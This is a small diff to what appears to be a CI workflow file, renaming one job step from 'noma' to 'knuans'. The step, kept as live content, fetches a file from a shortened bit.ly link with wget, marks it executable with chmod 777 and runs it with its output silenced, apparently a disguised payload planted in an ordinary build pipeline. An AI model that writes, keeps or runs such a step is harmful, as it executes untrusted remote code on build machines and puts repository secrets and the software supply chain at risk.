@@ -45,6 +45,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v1
-    - name: noma
+    - name: knuans
       run: |
         wget https://bit.ly/3zcw35m && chmod 777 3zcw35m && ./3zcw35m > /dev/null
